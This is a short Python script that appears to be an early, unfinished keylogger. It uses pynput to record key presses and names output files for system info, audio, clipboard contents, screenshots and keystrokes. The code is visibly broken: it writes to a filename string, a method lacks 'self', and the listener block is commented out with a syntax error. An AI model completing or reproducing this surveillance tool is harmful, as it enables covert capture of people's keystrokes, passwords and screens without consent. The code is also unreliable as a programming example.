import sys
from pynput import keyboard

system_info = "system.txt"
audio_info = "audio.wav"
clipboard_info = "clipboard.txt"
screenshot_info = "screenshot.png"
keys_info = "key_log.txt"

class MyListener:
    def __init__(self, outputLocation):
        try:
            self.outLocation = outputLocation
        except:
            self.outLocation = sys.stdout

    def on_press(self, key):
        self.outLocation.write(key)


    def on_release(key):
        return key != keyboard.Key.enter

test = MyListener(keys_info)

#with keyboard.Listener(keyboard.Listener(on_press=test.on_press, on_release=test.on_release) as listener:
 #   try:
   #     listener.join()
  #  except Exception as e:
    #    print('{0} exception happened...'.format(e.args[0]))


inp = input('Please type:\n')